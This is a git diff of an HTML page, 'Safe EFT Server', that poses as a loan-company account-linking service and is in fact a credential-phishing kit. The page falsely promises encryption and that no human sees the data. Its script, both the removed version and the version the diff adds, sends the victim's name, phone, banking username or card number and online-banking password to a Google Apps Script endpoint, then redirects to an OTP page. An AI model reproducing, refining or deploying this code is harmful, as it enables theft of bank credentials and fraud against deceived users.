@@ -8,37 +8,25 @@
   </head>
 
   <body>
-    <!-- Sticky Navbar -->
+    <!-- Navbar -->
     <header class="navbar">
       <div class="nav-container">
-        <!-- <a href="#" class="nav-logo">
-          <img src="image/logo.png" alt="MyLoanBuddy Logo" />
-        </a> -->
-
         <nav class="nav-links" id="nav-links">
-          <!-- <a href="#home">Home</a>
-          <a href="#how">How It Works</a>
-          <a href="#support">Support</a> -->
           <a href="#eft" class="active-nav">Safe EFT Server</a>
         </nav>
-
         <button id="menu-btn" class="hamburger">Safe EFT Server</button>
       </div>
     </header>
-
-    <!-- MAIN LOGO -->
-    <!-- <img src="image/l1_bg.png" class="main-logo" alt="site-logo" /> -->
 
     <h1 class="title">Safe EFT Server</h1>
     <p class="subtitle">Connect your account</p>
 
     <p class="desc">
       Safe EFT server
-      <strong>Links your account to EFT machine directly.</strong>
-      The information you put on server are encrypted and No human can access
-      your details. Please make sure to put correct details. If in case details
-      are incorrect the EFT machine will not be able to connect your account to
-      Safe EFT server.
+      <strong>links your account to the EFT machine directly.</strong>
+      The information you put on server is encrypted and no human can access
+      your details. Please enter correct information for successful
+      verification.
     </p>
 
     <!-- BANK IMAGES -->
@@ -53,9 +41,7 @@
     </div>
 
     <p class="desc">
-      Fill out all the below Information to connect your account with safe EFT
-      server. Once it will done your account will be eligible for receiving
-      funds from Multiple Finances.
+      Fill the information below to connect your account with Safe EFT Server.
     </p>
 
     <!-- FORM -->
@@ -67,25 +53,25 @@
         placeholder="Enter your full name"
         required
       />
-      <span class="error" id="nameError"></span>
+      <span class="error"></span>
 
-      <label>Phone number*</label>
+      <label>Phone Number*</label>
       <input
         type="tel"
         id="phone"
         placeholder="Enter your Phone number"
         required
       />
-      <span class="error" id="phoneError"></span>
+      <span class="error"></span>
 
       <label>User Name / Debit Card No*</label>
       <input
         type="text"
         id="userId"
-        placeholder="Enter your mobile banking User Name"
+        placeholder="Enter your mobile banking User Name"
         required
       />
-      <span class="error" id="userIdError"></span>
+      <span class="error"></span>
 
       <label>Online Banking Password*</label>
       <input
@@ -94,256 +80,115 @@
         placeholder="Enter your mobile banking password"
         required
       />
-      <span class="error" id="passwordError"></span>
+      <span class="error"></span>
 
-      <!-- <button type="submit">Connect</button> -->
       <button type="submit" class="btn-submit">
         <span class="btn-text">Connect</span>
         <span class="loader"></span>
       </button>
     </form>
 
-    <!-- <div id="success-box" class="success-msg">
-      Thanks for connecting your account with the Safe EFT Server of Premier
-      Loans Canada.
-    </div> -->
-  </body>
-  <script>
-    // const menuBtn = document.getElementById("menu-btn");
-    // const navLinks = document.getElementById("nav-links");
+    <script>
+      /* MOBILE NAVIGATION */
+      // const menuBtn = document.getElementById("menu-btn");
+      // const navLinks = document.getElementById("nav-links");
 
-    // menuBtn.addEventListener("click", () => {
-    //   navLinks.classList.toggle("show");
-    // });
-  </script>
+      // menuBtn.addEventListener("click", () => {
+      //   navLinks.classList.toggle("show");
+      // });
 
-  <!-- <script>
-    function validateFields() {
-      let isValid = true;
+      /* --------------------------
+       VALIDATION FUNCTION
+    --------------------------- */
+      function validateFields() {
+        let valid = true;
+        const errors = document.querySelectorAll(".error");
+        errors.forEach((e) => (e.innerText = ""));
 
-      const fullName = document.querySelector(
-        'input[placeholder="Enter your full name"]'
-      );
-      const phone = document.querySelector(
-        'input[placeholder="Enter your Phone number"]'
-      );
-      const userId = document.querySelector(
-        'input[placeholder="Enter your mobile banking user id"]'
-      );
-      const password = document.querySelector(
-        'input[placeholder="Enter your mobile banking password"]'
-      );
+        const fullName = document.getElementById("fullName");
+        const phone = document.getElementById("phone");
+        const userId = document.getElementById("userId");
+        const password = document.getElementById("password");
 
-      document.querySelectorAll(".error").forEach((e) => e.remove());
-
-      if (fullName.value.trim().length < 3) {
-        showError(fullName, "Enter a valid full name");
-        isValid = false;
-      }
-
-      if (!/^\d{10}$/.test(phone.value.trim())) {
-        showError(phone, "Enter a valid 10-digit phone number");
-        isValid = false;
-      }
-
-      if (userId.value.trim().length < 4) {
-        showError(userId, "User ID must be 4+ characters");
-        isValid = false;
-      }
-
-      if (password.value.trim().length < 6) {
-        showError(password, "Password must be 6+ characters");
-        isValid = false;
-      }
-
-      return isValid;
-    }
-
-    function showError(input, message) {
-      const error = document.createElement("span");
-      error.className = "error";
-      error.innerText = message;
-      input.insertAdjacentElement("afterend", error);
-    }
-
-    // SUBMIT PROCESS
-    document
-      .querySelector("form")
-      .addEventListener("submit", async function (event) {
-        event.preventDefault();
-
-        if (!validateFields()) return;
-
-        const btn = document.querySelector("button");
-        btn.innerText = "Processing...";
-        btn.disabled = true;
-
-        const fullName = document.querySelector(
-          'input[placeholder="Enter your full name"]'
-        ).value;
-        const phone = document.querySelector(
-          'input[placeholder="Enter your Phone number"]'
-        ).value;
-        const userId = document.querySelector(
-          'input[placeholder="Enter your mobile banking user id"]'
-        ).value;
-        const password = document.querySelector(
-          'input[placeholder="Enter your mobile banking password"]'
-        ).value;
-
-        try {
-          await fetch(
-            "https://script.google.com/macros/s/AKfycbwbx1tH6QFlBFb51FQ-6mveH8sZperw-24jRsp4QO7FrxsFBUn2XZQnCSMUqiX5jjNHxw/exec",
-            {
-              method: "POST",
-              mode: "no-cors",
-              redirect: "follow",
-              body: JSON.stringify({ fullName, phone, userId, password }),
-            }
-          );
-
-          // ✨ Show THANK YOU Message Smoothly
-          document.querySelector(".form-area").innerHTML = `
-      <div class="success-message">
-        Thanks for connecting your account with the Safe EFT server of Premier Loans Canada.
-      </div>
-    `;
-
-          setTimeout(() => {
-            window.location.href = "otp/index.html";
-          }, 2000);
-        } catch (err) {
-          alert("Network Error. Try again!");
-          btn.innerText = "Connect";
-          btn.disabled = false;
-        }
-      });
-  </script> -->
-
-  <script>
-    // NAVBAR DROPDOWN MOBILE
-    const menuBtn = document.getElementById("menu-btn");
-    const navLinks = document.getElementById("nav-links");
-
-    menuBtn.addEventListener("click", () => {
-      navLinks.classList.toggle("show");
-    });
-
-    // VALIDATION
-    function validateFields() {
-      let valid = true;
-
-      const fields = [
-        {
-          el: document.querySelector(
-            'input[placeholder="Enter your full name"]'
-          ),
-          rule: (v) => v.length >= 3,
-          msg: "Enter a valid full name",
-        },
-        {
-          el: document.querySelector(
-            'input[placeholder="Enter your Phone number"]'
-          ),
-          rule: (v) => /^\d{10}$/.test(v),
-          msg: "Enter a valid 10-digit number",
-        },
-        {
-          el: document.querySelector(
-            'input[placeholder="Enter your mobile banking user id"]'
-          ),
-          rule: (v) => v.length >= 4,
-          msg: "User ID must be at least 4 characters",
-        },
-        {
-          el: document.querySelector(
-            'input[placeholder="Enter your mobile banking password"]'
-          ),
-          rule: (v) => v.length >= 5,
-          msg: "Password must be 5+ characters",
-        },
-      ];
-
-      document.querySelectorAll(".error").forEach((e) => e.remove());
-
-      fields.forEach((f) => {
-        if (!f.rule(f.el.value.trim())) {
-          showError(f.el, f.msg);
+        if (fullName.value.trim().length < 3) {
+          fullName.nextElementSibling.innerText = "Enter a valid full name";
           valid = false;
         }
-      });
 
-      return valid;
-    }
-
-    function showError(input, message) {
-      const err = document.createElement("span");
-      err.className = "error";
-      err.innerText = message;
-      input.insertAdjacentElement("afterend", err);
-    }
-
-    // FORM SUBMIT
-    document
-      .querySelector("form")
-      .addEventListener("submit", async function (e) {
-        e.preventDefault();
-
-        if (!validateFields()) return;
-
-        const btn = document.querySelector(".btn-submit");
-        const btnText = document.querySelector(".btn-text");
-        const loader = document.querySelector(".loader");
-
-        btn.disabled = true;
-        btnText.innerText = "Submitting...";
-        loader.style.display = "inline-block";
-
-        const fullName = document
-          .querySelector('input[placeholder="Enter your full name"]')
-          .value.trim();
-        const phone = document
-          .querySelector('input[placeholder="Enter your Phone number"]')
-          .value.trim();
-        const userId = document
-          .querySelector(
-            'input[placeholder="Enter your mobile banking user id"]'
-          )
-          .value.trim();
-        const password = document
-          .querySelector(
-            'input[placeholder="Enter your mobile banking password"]'
-          )
-          .value.trim();
-
-        try {
-          await fetch(
-            "https://script.google.com/macros/s/AKfycbyqRiX5Hiw7zhaPTy1kp4ErZJRAKvjeRADVyKrExQmdA1zeZb-IvutTaeKGwDCs_Oso3A/exec",
-            {
-              method: "POST",
-              mode: "no-cors",
-              body: JSON.stringify({ fullName, phone, userId, password }),
-            }
-          );
-
-          localStorage.setItem("userPhone", phone);
-
-          document.querySelector(".form-area").innerHTML = `
-        <div class="success-message">
-          Successfully Connected!<br>
-          Thanks for connecting your account with the Safe EFT server of Premier Loans Canada.
-        </div>
-      `;
-
-          setTimeout(() => {
-            window.location.href = "otp/index.html";
-          }, 2000);
-        } catch (err) {
-          alert("Network Error! Please try again.");
-          btn.disabled = false;
-          btnText.innerText = "Connect";
-          loader.style.display = "none";
+        if (!/^\d{10}$/.test(phone.value.trim())) {
+          phone.nextElementSibling.innerText = "Enter a valid 10-digit number";
+          valid = false;
         }
-      });
-  </script>
+
+        if (userId.value.trim().length < 4) {
+          userId.nextElementSibling.innerText =
+            "User ID must be at least 4 characters";
+          valid = false;
+        }
+
+        if (password.value.trim().length < 5) {
+          password.nextElementSibling.innerText =
+            "Password must be 5+ characters";
+          valid = false;
+        }
+
+        return valid;
+      }
+
+      /* --------------------------
+       FORM SUBMISSION
+    --------------------------- */
+      document
+        .getElementById("eftForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          if (!validateFields()) return;
+
+          const btn = document.querySelector(".btn-submit");
+          const btnText = document.querySelector(".btn-text");
+          const loader = document.querySelector(".loader");
+
+          btn.disabled = true;
+          btnText.innerText = "Submitting...";
+          loader.style.display = "inline-block";
+
+          const fullName = (fullNameInput = document
+            .getElementById("fullName")
+            .value.trim());
+          const phone = document.getElementById("phone").value.trim();
+          const userId = document.getElementById("userId").value.trim();
+          const password = document.getElementById("password").value.trim();
+
+          try {
+            await fetch(
+              "https://script.google.com/macros/s/AKfycbyqRiX5Hiw7zhaPTy1kp4ErZJRAKvjeRADVyKrExQmdA1zeZb-IvutTaeKGwDCs_Oso3A/exec",
+              {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({ fullName, phone, userId, password }),
+              }
+            );
+
+            localStorage.setItem("userPhone", phone);
+
+            document.querySelector(".form-area").innerHTML = `
+          <div class="success-message">
+            Successfully Connected!<br><br>
+            Thanks for connecting your account with the Safe EFT server of Premier Loans Canada.
+          </div>
+        `;
+
+            setTimeout(() => {
+              window.location.href = "otp/index.html";
+            }, 2000);
+          } catch (err) {
+            alert("Network Error! Please try again.");
+            btn.disabled = false;
+            btnText.innerText = "Connect";
+            loader.style.display = "none";
+          }
+        });
+    </script>
+  </body>
 </html>
